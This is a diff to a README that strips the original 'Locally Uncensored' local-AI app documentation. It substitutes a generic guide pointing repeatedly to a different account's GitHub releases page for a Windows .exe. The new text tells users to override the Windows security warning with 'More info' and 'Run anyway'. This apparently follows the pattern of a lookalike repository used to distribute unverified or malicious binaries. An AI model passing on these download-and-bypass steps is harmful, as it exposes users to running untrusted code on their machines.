@@ -1,301 +1,192 @@
-<div align="center">
-
-<img src="logos/LU-monogram-bw.png" alt="Locally Uncensored" width="80">
-
-# Locally Uncensored
-
-**Generate anything — text, images, video. Locally. Uncensored.**
-
-No cloud. No data collection. No API keys. Auto-detects 12 local backends. Your AI, your rules.
-
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL%20v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![GitHub stars](https://img.shields.io/github/stars/PurpleDoubleD/locally-uncensored?style=social)](https://github.com/PurpleDoubleD/locally-uncensored/stargazers)
-[![GitHub last commit](https://img.shields.io/github/last-commit/PurpleDoubleD/locally-uncensored)](https://github.com/PurpleDoubleD/locally-uncensored/commits)
-[![GitHub Discussions](https://img.shields.io/github/discussions/PurpleDoubleD/locally-uncensored)](https://github.com/PurpleDoubleD/locally-uncensored/discussions)
-[![Website](https://img.shields.io/badge/Website-locallyuncensored.com-8b5cf6)](https://locallyuncensored.com)
-
-<img src="docs/demo.gif" alt="Locally Uncensored Demo" width="700">
-
-*The only desktop app that runs AI chat, image, and video generation — locally, one click, no cloud.*
-
-[Download](#-download) · [Features](#-features) · [Quick Start](#-quick-start) · [Why This App?](#-why-locally-uncensored) · [Roadmap](#-roadmap)
-
-</div>
-
----
-
-### Screenshots
-
-| Chat with Personas | Image / Video Generation |
-|:---:|:---:|
-| ![Chat](docs/screenshots/chat_personas_dark.png) | ![Create](docs/screenshots/create_dark.png) |
-| **Model Manager** | **Create View with Parameters** |
-| ![Models](docs/screenshots/model_manager_dark.png) | ![Create Params](docs/screenshots/create_params_dark.png) |
-
----
-
-## v2.3.3 — Current Release
-
-**Remote Access, Codex Streaming, Qwen 3.6 Day-0, ERNIE-Image, 2105 Tests**
-
-### Remote Access + Mobile Web App
-- **Access your AI from your phone** — Dispatch via LAN or Cloudflare Tunnel (Internet)
-- **Full mobile web app** — Hamburger drawer, chat list, Codex mode, file attach, thinking toggle, Plugins (Caveman + Personas)
-- **Mobile Agent Mode** — 13 tools with Thought/Action/Observation cards
-- **Security hardened** — 6-digit passcodes, rate limiting, JWT auth, permissions enforced, CSP headers
-
-### Codex Coding Agent — Major Upgrade
-- **Live streaming** between tool calls — see tokens as they generate
-- **Continue capability** — tool-call history persisted, model remembers previous actions
-- **AUTONOMY CONTRACT** — model completes ALL steps without premature stopping
-- **Fallback answer** — never shows empty bubble after tool calls
-
-### Agent Mode — 13-Phase Rewrite
-- **Parallel tool execution** with side-effect grouping
-- **Budget system** — max 50 tool calls / 25 iterations per task
-- **Sub-agent delegation** — `delegate_task` spawns isolated sub-agents
-- **MCP integration** — external tools via ToolRegistry
-- **Filesystem awareness** — agent uses file_list/system_info before acting
-
-### New Models + Image Gen
-- **Qwen 3.6** (day-0) — 35B MoE, vision + agentic coding + thinking. One-click download
-- **ERNIE-Image** (Baidu) — Turbo (8 steps) + Base (50 steps). Plug & play, no custom nodes
-- **Image-to-Image** — Upload source, adjust denoise, transform with any model
-- **75+ downloadable models** — all URLs verified
-
-### UI/UX
-- **AE-style text header** — clean typography for better discoverability
-- **Plugins dropdown** — Caveman Mode + Personas in one menu
-- **Thinking mode** — tri-state, auto-retry, universal tag stripper
-- **2105 tests** — comprehensive smoke tests covering the entire app
-
----
-
-## Why Locally Uncensored?
-
-| Feature | Locally Uncensored | Open WebUI | LM Studio | SillyTavern |
-|---------|:-:|:-:|:-:|:-:|
-| AI Chat | **Yes** | Yes | Yes | Yes |
-| **Coding Agent (Codex)** | **Yes** | No | No | No |
-| **14 Agent Tools + MCP** | **Yes** | No | No | No |
-| **Plug & Play Setup** | **12 Backends** | No | Built-in | No |
-| **Multi-Provider** (20+ Presets) | **Yes** | Yes | Yes | No |
-| **A/B Model Compare** | **Yes** | No | No | No |
-| **Local Benchmark** | **Yes** | No | No | No |
-| Image Generation | **Yes** | No | No | No |
-| **Image-to-Image** | **Yes** | No | No | No |
-| **Image-to-Video** | **Yes** | No | No | No |
-| Video Generation | **Yes** | No | No | No |
-| **File Upload + Vision** | **Yes** | Yes | Yes | No |
-| **Thinking Mode** | **Yes** | No | No | No |
-| **Granular Permissions** | **7 Categories** | No | No | No |
-| Uncensored by Default | **Yes** | No | No | Partial |
-| Memory System | **Yes** | Plugin | No | No |
-| Agent Workflows | **Yes** | No | No | No |
-| Document Chat (RAG) | **Yes** | Yes | No | No |
-| Voice (STT + TTS) | **Yes** | Partial | No | No |
-| **Remote Access (Phone)** | **Yes** | No | No | No |
-| **Plugins (Caveman + Personas)** | **Yes** | No | No | Yes |
-| **Auto-Update** | **Yes** | No | Yes | No |
-| Open Source | **AGPL-3.0** | MIT | No | AGPL |
-| No Docker | **Yes** | No | Yes | Yes |
+# 🧠 locally-uncensored - Run local AI on Windows
 
----
+[![Download locally-uncensored](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Bosnian-frangipanni945/locally-uncensored/releases)
 
-## Features
+## 🚀 Getting Started
 
-### Core
-- **Plug & Play Setup** — First-launch wizard auto-detects 12 local backends. Nothing installed? One-click in-app Ollama download and install with progress bar. ComfyUI one-click install with step-by-step progress. Configurable ComfyUI port and path in Settings. Zero config needed.
-- **Uncensored AI Chat** — Abliterated models with zero restrictions. Streaming + thinking display.
-- **Multi-Provider** — 20+ presets. Local: Ollama, LM Studio, vLLM, KoboldCpp, llama.cpp, LocalAI, Jan, TabbyAPI, GPT4All, Aphrodite, SGLang, TGI. Cloud: OpenAI, Anthropic, OpenRouter, Groq, Together, DeepSeek, Mistral. Switch per conversation.
-- **Codex Coding Agent** — Live streaming between tool calls, continue capability, AUTONOMY CONTRACT. File tree, folder picker, up to 50 iterations.
-- **Agent Mode** — 14 tools + MCP: web search/fetch, file I/O, shell, code execution, screenshots, system info, time. Parallel execution, sub-agents, budget system.
-- **Remote Access** — Access your AI from your phone via LAN or Cloudflare Tunnel. Full mobile web app with Agent Mode, Codex, plugins, file attach.
-- **Image Generation** — FLUX 2 Klein, FLUX.1 (schnell/dev), Z-Image Turbo/Base, Juggernaut XL, RealVisXL, DreamShaper XL via ComfyUI. Full parameter control, no content filter.
-- **Image-to-Image** — Upload a source image, adjust denoise strength, transform with any image model.
-- **Video Generation** — Wan 2.1, HunyuanVideo 1.5, LTX 2.3, AnimateDiff Lightning, CogVideoX, FramePack F1 on your GPU.
-- **Image-to-Video** — FramePack F1 (6 GB VRAM), CogVideoX 5B, SVD-XT. Upload an image, get video.
+locally-uncensored is a Windows desktop app for local AI chat, agent mode, image generation, and video generation. It runs as a single `.exe`, so you do not need Docker or a long setup.
 
-### Intelligence
-- **Thinking Mode** — Provider-agnostic. See the AI's reasoning before the answer. Toggle from chat input.
-- **File Upload + Vision** — Drag & drop, paste, clip button. Vision models analyze images.
-- **Granular Permissions** — 7 tool categories, 3 permission levels, per-conversation overrides.
-- **Smart Tool Selection** — Reduces tool definitions per request by ~80%. JSON repair for local LLMs.
-- **Memory System** — Persistent across conversations. Auto-extraction. Export/import.
-- **Agent Workflows** — Multi-step chains. 3 built-in (Research, Summarize URL, Code Review). Visual builder.
+Use it to chat with local models like Ollama, Gemma 4, Llama, and Qwen. You can also connect to cloud APIs like OpenAI and Anthropic if you want. The app keeps the workflow in one place and runs from your desktop.
 
-### Productivity
-- **Model A/B Compare** — Same prompt, two models, side by side. Parallel streaming.
-- **Local Benchmark** — One-click benchmark any model. Tokens/sec leaderboard.
-- **Document Chat (RAG)** — Upload PDFs, DOCX, TXT. Hybrid search with source citations.
-- **Voice Chat** — Push-to-talk STT + sentence-level TTS streaming.
-- **20+ Personas** — Pre-built characters. Switch without prompt engineering.
-- **Chat Export** — Markdown or JSON. Token counter. Keyboard shortcuts.
+## 📥 Download
 
-### Customization
-- **Plugins Dropdown** — Caveman Mode (Off/Lite/Full/Ultra for terse responses) + 20+ Personas in one menu. Per-chat. Works in Chat, Agent, Codex.
-- **Auto-Update** — Signed NSIS installer. In-app download with progress bar. User-controlled restart (no forced updates). Settings survive updates.
+Go to the [releases page](https://github.com/Bosnian-frangipanni945/locally-uncensored/releases) and download the latest Windows file.
 
-### Polish
-- **Standalone Desktop App** — Tauri v2 Rust backend. Download .exe, run it.
-- **Model Load/Unload** — iOS-style toggle in header. Load into VRAM, unload when done.
-- **AE-Style Header** — Clean typography navigation. Models, Settings, Downloads at a glance.
-- **Privacy First** — Zero tracking, all API calls proxied locally. ComfyUI process auto-killed on app close.
-
-## Tech Stack
-
-- **Desktop**: Tauri v2 (Rust backend, standalone .exe)
-- **Frontend**: React 19, TypeScript, Tailwind CSS 4, Framer Motion
-- **State**: Zustand with localStorage persistence
-- **AI Backend**: 20+ providers (Ollama, LM Studio, vLLM, KoboldCpp, llama.cpp, LocalAI, Jan, OpenAI, Anthropic, OpenRouter, Groq, and more), ComfyUI, faster-whisper
-- **Build**: Vite 8 (dev), Tauri CLI (production)
-
----
-
-## Download
-
-### Windows
-Download the installer from [Releases](https://github.com/PurpleDoubleD/locally-uncensored/releases/latest):
-- **`.exe`** — NSIS installer (recommended)
-- **`.msi`** — Windows Installer
-
-> **Other platforms:** The source code builds on Linux and macOS via `npm run tauri build`, but only Windows is officially tested and supported.
-
-> **Plug & Play:** Just install and launch. The setup wizard auto-detects all 12 supported local backends ([Ollama](https://ollama.com/), [LM Studio](https://lmstudio.ai/), [vLLM](https://github.com/vllm-project/vllm), [KoboldCpp](https://github.com/LostRuins/koboldcpp), llama.cpp, LocalAI, Jan, GPT4All, text-generation-webui, TabbyAPI, Aphrodite, SGLang). Nothing installed yet? The wizard shows one-click install links for every backend.
-
----
-
-## Quick Start
-
-> **New to Locally Uncensored?** Read the [Getting Started Guide](https://locallyuncensored.com/guide/) with screenshots for every step.
-
-### From Source
-
-```bash
-git clone https://github.com/PurpleDoubleD/locally-uncensored.git
-cd locally-uncensored
-npm install
-npm run dev
-```
-
-### Windows One-Click Setup
-
-```bash
-git clone https://github.com/PurpleDoubleD/locally-uncensored.git
-cd locally-uncensored
-setup.bat
-```
-
-Installs Node.js, Ollama, downloads an uncensored model, launches the app.
-
-### Image & Video Generation
-
-Open the **Create** tab. ComfyUI is auto-detected or one-click installed. Models download with one click. Workflow is set to **Auto** — just write a prompt and hit Generate.
-
----
-
-## Recommended Models
-
-### Text (any local backend)
-
-| Model | VRAM | Best For |
-|-------|------|----------|
-| **Qwen 3.6 35B MoE** | 24 GB | Vision + agentic coding + thinking. Brand new. |
-| **GLM-4.7-Flash IQ2** | 12 GB | Strongest 30B class. Tool calling. 198K context. |
-| **Gemma 4 E4B** | 4 GB | Lightweight, fast, great for small GPUs. |
-| **Qwen 3.5 35B MoE** | 16 GB | Best agentic, 256K context. SWE-bench leader. |
-| **Gemma 4 31B** | 16 GB | Frontier dense model, native tools + vision. |
-| Hermes 3 8B | 6 GB | Agent Mode. Uncensored + tool calling. |
-| DeepSeek R1 (8B-70B) | 6-48 GB | Chain-of-thought reasoning. |
-
-### Image (ComfyUI)
-
-| Model | VRAM | Notes |
-|-------|------|-------|
-| FLUX.1 Schnell / Dev | 8-10 GB | Best text-to-image. Fast (schnell) or quality (dev). |
-| FLUX 2 Klein 4B | 8-10 GB | Next-gen, fastest FLUX model. |
-| ERNIE-Image Turbo | 24 GB | Baidu DiT, 8 steps, 1024x1024. New. |
-| Z-Image Turbo | 10-16 GB | Uncensored, 8-15 sec per image. |
-| Juggernaut XL V9 | 6 GB | Best photorealistic SDXL. |
-
-### Video (ComfyUI)
-
-| Model | VRAM | Notes |
-|-------|------|-------|
-| Wan 2.1 T2V 1.3B | 8-10 GB | Fast entry point, 480p. |
-| Wan 2.1 T2V 14B | 12+ GB | High quality, 720p. |
-| FramePack F1 (I2V) | 6 GB | Image-to-video, revolutionary low VRAM. |
-| AnimateDiff Lightning | 6-8 GB | Ultra-fast 4-step animation. |
-| HunyuanVideo 1.5 | 12+ GB | Excellent temporal consistency. |
-
----
-
-## Roadmap
-
-- [x] **Plug & Play Setup** (auto-detect 12 local backends, one-click install links)
-- [x] Codex Coding Agent
-- [x] MCP Tool Registry (13 tools)
-- [x] Granular Permissions (7 categories)
-- [x] File Upload + Vision
-- [x] Thinking Mode (provider-agnostic)
-- [x] Model Load/Unload from header
-- [x] Multi-Provider (20+ presets)
-- [x] Agent Mode + Workflows
-- [x] Memory System
-- [x] A/B Compare + Local Benchmark
-- [x] RAG / Document Chat
-- [x] Voice Chat (STT + TTS)
-- [x] ComfyUI Plug & Play (auto-detect, one-click install)
-- [x] 20 Image + Video Model Bundles
-- [x] Image-to-Image (I2I)
-- [x] Image-to-Video (I2V) — FramePack, CogVideoX, SVD
-- [x] Z-Image + FLUX 2 + ERNIE-Image support
-- [x] Dynamic Workflow Builder (15 strategies)
-- [x] VRAM-Aware Model Filtering
-- [x] Think Mode in Chat Input
-- [x] Remote Access (LAN + Cloudflare Tunnel)
-- [x] Mobile Web App (Agent, Codex, Plugins, Thinking)
-- [x] Codex Streaming + Continue + Autonomy Contract
-- [x] Agent 13-Phase Rewrite (parallel, budget, sub-agents, MCP)
-- [x] Auto-Update (signed NSIS installer)
-- [x] Qwen 3.6 Day-0 Support
-- [x] Plugins Dropdown (Caveman + Personas)
-- [ ] Voice Mode (Qwen Omni live voice)
-- [ ] Upscale + Inpainting
-
----
-
-## Build from Source
-
-```bash
-git clone https://github.com/PurpleDoubleD/locally-uncensored.git
-cd locally-uncensored
-npm install
-npm run dev          # Development
-npm run tauri build  # Production binary
-```
-
-## Platform Support
-
-| Platform | Status | Download |
-|----------|--------|----------|
-| **Windows** (10/11) | Fully tested | `.exe` / `.msi` |
-| Linux / macOS | Build from source | `npm run tauri build` |
-
-## Contributing
-
-Check out the [Contributing Guide](CONTRIBUTING.md). See [open issues](https://github.com/PurpleDoubleD/locally-uncensored/issues) or the [Roadmap](#-roadmap).
-
-## License
-
-AGPL-3.0 License — see [LICENSE](LICENSE).
-
----
-
-<div align="center">
-
-**Your data stays on your machine.**
-
-[Website](https://locallyuncensored.com) · [Report Bug](https://github.com/PurpleDoubleD/locally-uncensored/issues/new?template=bug_report.yml) · [Request Feature](https://github.com/PurpleDoubleD/locally-uncensored/issues/new?template=feature_request.yml) · [Discussions](https://github.com/PurpleDoubleD/locally-uncensored/discussions)
-
-</div>
+Look for the file that matches your system. In most cases, this will be a Windows `.exe` file or a packaged app file for Windows.
+
+## 🖱️ Install and Run
+
+1. Open the [releases page](https://github.com/Bosnian-frangipanni945/locally-uncensored/releases).
+2. Download the latest Windows build.
+3. Save the file to your Downloads folder or another folder you can find easily.
+4. If the download is a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click `locally-uncensored.exe` to start the app.
+7. If Windows shows a security prompt, choose **More info** and then **Run anyway** if you trust the file from the release page.
+
+## 🛠️ First-Time Setup
+
+When the app opens for the first time, you can choose how you want to use it.
+
+### Local AI models
+If you want to run everything on your own machine, connect one of these:
+
+- **Ollama** for local text chat
+- **Gemma 4** for modern local model support
+- **Llama** for general chat and reasoning
+- **Qwen** for chat and coding tasks
+
+If Ollama is already on your PC, the app should find it if it is running on the usual local address.
+
+### Cloud AI models
+If you want to use online models, add your API key for:
+
+- **OpenAI**
+- **Anthropic**
+
+This gives you another way to chat, build prompts, and compare results.
+
+### Image and video tools
+For image generation, connect a local image tool such as **ComfyUI** if you use one. For video generation, use the built-in workflow tools that ship with the app or connect your own local setup if needed.
+
+## 💻 System Requirements
+
+Use a Windows PC with enough power for local AI work.
+
+### Basic use
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 10 GB free disk space
+- A stable internet connection for the first download
+- A modern CPU
+
+### Better local model performance
+- 16 GB RAM or more
+- A GPU with enough memory for larger models
+- More free disk space for model files and generated media
+
+### For image and video work
+- 16 GB RAM or more
+- A recent NVIDIA or AMD GPU helps
+- Extra storage for model files, image output, and video output
+
+## 🧭 What You Can Do
+
+### Chat with local models
+Talk to models on your own computer without sending every prompt to a remote service.
+
+### Use agent mode
+Let the app handle step-by-step tasks, like planning, looking at context, and following instructions.
+
+### Generate images
+Create images from prompts and save them to your PC.
+
+### Generate video
+Use local video generation workflows for motion-based output.
+
+### Mix local and cloud models
+Switch between local models and online APIs based on speed, cost, or quality.
+
+## 🔌 Supported Model Sources
+
+The app is built to work with several common AI backends:
+
+- **Ollama**
+- **Gemma 4**
+- **Llama**
+- **Qwen**
+- **OpenAI**
+- **Anthropic**
+
+This gives you room to test different model types without changing your whole setup.
+
+## 🧰 Typical Use Cases
+
+- Chat with an AI assistant on your own machine
+- Run agent tasks for planning and structured work
+- Test prompts on local LLMs
+- Create images from text prompts
+- Produce video content from local workflows
+- Keep a desktop AI tool in one place
+- Use local models for more private work
+- Compare local output with cloud model output
+
+## 🧩 Basic Folder Setup
+
+You do not need to set up a coding project. The app runs as a normal Windows program.
+
+A simple setup looks like this:
+
+- Download the release file
+- Extract it if needed
+- Run the `.exe`
+- Connect a model source
+- Start chatting or creating
+
+## 🔐 Privacy and Local Use
+
+If you run local models, your prompts and outputs stay on your computer. That makes it easier to work on private tasks or keep testing in one place.
+
+If you connect OpenAI or Anthropic, those requests go through their services. Use the mode that fits your task.
+
+## 🧪 Tips for First Use
+
+- Start with a small model if your PC has limited RAM
+- Close other large apps before running image or video tasks
+- Keep your model files on a drive with free space
+- Test chat first before trying agent mode
+- Save API keys in the app settings if you use cloud models
+- Use one model source at a time until you know it works
+
+## 📁 Recommended Windows Setup
+
+For the smoothest start:
+
+- Download the latest release
+- Keep the app in a simple folder, like `C:\Apps\locally-uncensored`
+- Put model files on a drive with plenty of space
+- Use a desktop shortcut if you plan to open it often
+
+## ⚙️ Common Problems
+
+### The app does not open
+- Check that the file finished downloading
+- Try running the `.exe` again
+- Make sure Windows did not block the file
+- Re-download from the releases page if the file looks damaged
+
+### The app opens, but no model shows up
+- Confirm that Ollama or another backend is running
+- Check the model name in the app
+- Make sure the model is installed on your system
+- Restart the app after changing settings
+
+### Image generation is slow
+- Use a smaller image model
+- Close other heavy apps
+- Check your GPU and RAM usage
+- Lower image size if the app gives you that choice
+
+### Video generation takes a long time
+- Video work uses more memory and storage than chat
+- Keep enough free disk space
+- Try shorter clips first
+- Use a strong GPU if available
+
+## 🧠 Good Starting Flow
+
+1. Download the Windows release.
+2. Open the app.
+3. Connect Ollama or another local model.
+4. Send a short test prompt.
+5. Turn on agent mode if you need task help.
+6. Try image generation.
+7. Try video generation after the rest works.
+
+## 📌 Release Download
+
+Visit the [release page](https://github.com/Bosnian-frangipanni945/locally-uncensored/releases) to download and run the Windows app file from the latest build.
+
+## 🗂️ Project Topics
+
+agent-mode, ai, ai-chat, comfyui, desktop-app, gemma4, image-generation, llm, local-ai, local-llm, ollama, privacy, react, self-hosted, tauri, typescript, uncensored, video-generation
